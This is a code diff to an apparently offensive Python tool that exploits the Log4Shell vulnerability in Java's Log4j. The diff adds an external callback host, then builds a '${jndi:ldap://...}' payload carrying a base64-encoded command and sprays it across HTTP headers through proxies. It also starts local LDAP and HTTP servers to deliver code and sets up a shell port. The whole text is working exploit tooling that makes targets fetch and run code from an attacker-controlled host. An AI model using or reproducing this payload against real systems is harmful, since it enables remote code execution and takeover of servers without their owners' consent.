@@ -36,6 +36,7 @@ ALL_PAYLOADS = None
 PROXIES_LIST = []
 ALL_PAYLOADS = []
 LOCALIP = None
+EXTERNALIP = None
 SHELL_FLAG = False
 
 
@@ -94,7 +95,7 @@ def go_clutch(url=None,method="get",data={},headers={}):
 
 def spray_headers(target_options=None,command=None,args=None):
 
-    global LOCALIP,PROXIES_LIST,ALL_PAYLOADS
+    global LOCALIP,EXTERNALIP,PROXIES_LIST,ALL_PAYLOADS
     parsed_request = None
     additionalrequest_headers = {}
     additionalrequest_data    = {}
@@ -119,7 +120,7 @@ def spray_headers(target_options=None,command=None,args=None):
                 PROXIES_LIST.append(proxy_object)
 
     payloads = [
-        "Log4Shell-CS ${jndi:ldap://"+str(LOCALIP)+":"+str(args.ldapport)+"/"+base64encoder(command).decode()+"}",
+        "Log4Shell-CS ${jndi:ldap://"+str(EXTERNALIP)+":"+str(args.ldapport)+"/"+base64encoder(command).decode()+"}",
     ]
     headers = prepre_headers(additionalheaders=additionalheaders,
                         known_headers_path=KNOWN_HEADERS_PATH)
@@ -174,7 +175,7 @@ def start_http_server(PORT):
 def start_ldap_server(ports):
      # Create server
     try:
-        START_LDAP_SERVER(LOCALIP,int(ports['ldap']),int(ports['http']))
+        START_LDAP_SERVER(LOCALIP,EXTERNALIP,int(ports['ldap']),int(ports['http']))
     except Exception as e:
         print(e)
         exit()
@@ -187,9 +188,10 @@ def start_ldap_server(ports):
 
 def get_a_life(target_options):
     random_shell_port = random.randint(30000,60000)
-    global LOCALIP,SHELL_FLAG
+    global LOCALIP,EXTERNALIP,SHELL_FLAG
     args = target_options['args']
     LOCALIP = args.localhost
+    EXTERNALIP = args.externalhost
     command = args.command
     x = threading.Thread(target=start_http_server, args=(int(args.httpport),))
     x.start()
@@ -217,7 +219,9 @@ def main():
     extra_options.add_argument("-l", dest="ldapport",
         help="LDAP listening port ", default=1389)
     extra_options.add_argument("-i", dest="localhost",
-        help="HOST IP To use", default=1389,required=True)
+        help="HOST IP to use", required=True)
+    extra_options.add_argument("-e", dest="externalhost",
+        help="IP or DNS name to use for callback", required=True)
 
     payload_option = parser.add_argument_group("Payloads", "These options can be used to specify payloads")
     payload_option.add_argument("-aH", "--headers-list", dest="additionalheaders",
